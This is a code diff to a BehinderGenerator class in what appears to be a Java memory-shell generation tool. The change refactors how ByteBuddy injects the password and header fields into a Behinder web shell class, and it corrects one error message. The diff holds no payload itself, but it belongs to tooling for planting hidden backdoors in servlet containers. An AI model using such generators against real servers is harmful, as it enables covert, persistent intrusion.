@@ -7,11 +7,10 @@ import com.reajason.javaweb.memshell.config.BehinderConfig;
 import com.reajason.javaweb.memshell.config.ShellConfig;
 import net.bytebuddy.ByteBuddy;
 import net.bytebuddy.dynamic.DynamicType;
-import net.bytebuddy.implementation.FieldAccessor;
-import net.bytebuddy.implementation.SuperMethodCall;
-import net.bytebuddy.matcher.ElementMatchers;
 import org.apache.commons.codec.digest.DigestUtils;
 import org.apache.commons.lang3.StringUtils;
+
+import static net.bytebuddy.matcher.ElementMatchers.named;
 
 /**
  * @author ReaJason
@@ -28,7 +27,7 @@ public class BehinderGenerator {
 
     public DynamicType.Builder<?> getBuilder() {
         if (behinderConfig.getShellClass() == null) {
-            throw new IllegalArgumentException("godzillaConfig.getClazz() == null");
+            throw new IllegalArgumentException("behinderConfig.getClazz() == null");
         }
         if (StringUtils.isBlank(behinderConfig.getPass())) {
             throw new IllegalArgumentException("behinderConfig.getPass().isBlank()");
@@ -39,11 +38,9 @@ public class BehinderGenerator {
                 .redefine(behinderConfig.getShellClass())
                 .name(behinderConfig.getShellClassName())
                 .visit(new TargetJreVersionVisitorWrapper(shellConfig.getTargetJreVersion()))
-                .constructor(ElementMatchers.any())
-                .intercept(SuperMethodCall.INSTANCE
-                        .andThen(FieldAccessor.ofField("pass").setsValue(md5Key))
-                        .andThen(FieldAccessor.ofField("headerName").setsValue(behinderConfig.getHeaderName()))
-                        .andThen(FieldAccessor.ofField("headerValue").setsValue(behinderConfig.getHeaderValue())));
+                .field(named("pass")).value(md5Key)
+                .field(named("headerName")).value(behinderConfig.getHeaderName())
+                .field(named("headerValue")).value(behinderConfig.getHeaderValue());
 
         if (shellConfig.isJakarta()) {
             builder = builder.visit(ServletRenameVisitorWrapper.INSTANCE);
